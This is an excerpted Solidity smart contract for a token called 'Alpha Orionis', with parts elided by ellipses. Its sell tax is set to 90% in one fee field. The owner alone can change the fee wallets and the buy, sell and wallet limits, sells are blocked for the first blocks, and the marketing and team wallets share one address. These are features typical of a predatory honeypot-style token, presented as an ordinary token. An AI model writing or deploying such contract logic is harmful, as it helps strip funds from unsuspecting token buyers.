...
interface IERC20 {
    ...
    function BOF(address account) external view returns (uint256);
...
contract AlphaOrionis is IERC20, Context, Ownable {
    ...
    uint256 private QA__Max_Buy = 10000000 * 10**9;
    uint256 private QA__Max_Wallet = 10000000  * 10**9;

    string private constant _symbol = "AO";
    string private constant _name = "Alpha Orionis";

    uint8 private constant _decimals = 9;
    uint256 private constant MAX = ~uint256(0);

    address private QA_Marketing = 0xB77066990AfCe419CA94F6DEBBBB2de5A2CB3290;
    address private QA_Team_Wallet = 0xB77066990AfCe419CA94F6DEBBBB2de5A2CB3290;
    ...
    uint256 private QA__Threshold = 3000000 * 10**9;
    uint256 private QA__Max_Sell = 10000000 * 10**9;
    uint256 private QA_genesis_block;

    Taxes public sellTaxes = Taxes(0, 90, 0, 0);
    ...
    constructor (address routerAddress) {
        ...
        _isExcludedFromFee[QA_Marketing] = true;
        _isExcludedFromFee[QA_Team_Wallet] = true;
        
        allowedTransfer[address(this)] = true;
        allowedTransfer[owner()] = true;
        allowedTransfer[pair] = true;
        allowedTransfer[QA_Marketing] = true;
        allowedTransfer[QA_Team_Wallet] = true;
    ...
    function BOF(address account) public view override returns (uint256) {
    ...
    function setTradingStatus(bool state) external onlyOwner{
        ...
        swapEnabled = state;
        if(state == true && QA_genesis_block == 0) QA_genesis_block = block.number;
    }
    ...
    function _transfer(address from, address to, uint256 amount) private {
        ...
        require(amount <= BOF(from),"You are trying to transfer more than your balance");
        ...
        if(!_isExcludedFromFee[from] && !_isExcludedFromFee[to] && block.number <= QA_genesis_block + 3) {
            require(to != pair, "Sells not allowed for first 3 blocks");
        }
        
        if(from == pair && !_isExcludedFromFee[to] && !swapping){
            require(amount <= QA__Max_Buy, "You are exceeding QA__Max_Buy");
            require(BOF(to) + amount <= QA__Max_Wallet, "You are exceeding QA__Max_Wallet");
        }
        
        if(from != pair && !_isExcludedFromFee[to] && !_isExcludedFromFee[from] && !swapping){
            require(amount <= QA__Max_Sell, "You are exceeding QA__Max_Sell");
            if(to != pair){
                require(BOF(to) + amount <= QA__Max_Wallet, "You are exceeding QA__Max_Wallet");
            }
            if(coolDownEnabled){
        ...
        if(BOF(from) - amount <= 10 *  10**decimals()) amount -= (10 * 10**decimals() + amount - BOF(from));
        
       
        bool canSwap = BOF(address(this)) >= QA__Threshold;
        if(!swapping && swapEnabled && canSwap && from != pair && !_isExcludedFromFee[from] && !_isExcludedFromFee[to]){
            if(to == pair)  swapAndLiquify(QA__Threshold, sellTaxes);
            else  swapAndLiquify(QA__Threshold, taxes);
        }
        bool takeFee = true;
        bool isSell = false;
    ...
    function swapAndLiquify(uint256 contractBalance, Taxes memory temp) private lockTheSwap{
        ...
        if(marketingAmt > 0){
            payable(QA_Marketing).sendValue(marketingAmt);
        }
        uint256 teamAmt = unitBalance * 2 * temp.team;
        if(teamAmt > 0){
            payable(QA_Team_Wallet).sendValue(teamAmt);
        }
    }
    ...
    function Update_Marketing_Wallet(address newWallet) external onlyOwner{
        QA_Marketing = newWallet;
    }
    
    function Update_Team_Wallet(address newWallet) external onlyOwner{
        QA_Team_Wallet = newWallet;
    }
    ...
    function UpdateThreshold_Amount(uint256 amount) external onlyOwner{
        QA__Threshold = amount * 10**_decimals;
    }
    ...
    function UpdateMaxTxLimit(uint256 maxBuy, uint256 maxSell) external onlyOwner{
        QA__Max_Buy = maxBuy * 10**decimals();
        QA__Max_Sell = maxSell * 10**decimals();
    }
    
    function UpdateMaxWallet(uint256 amount) external onlyOwner{
        QA__Max_Wallet = amount * 10**decimals();
    }
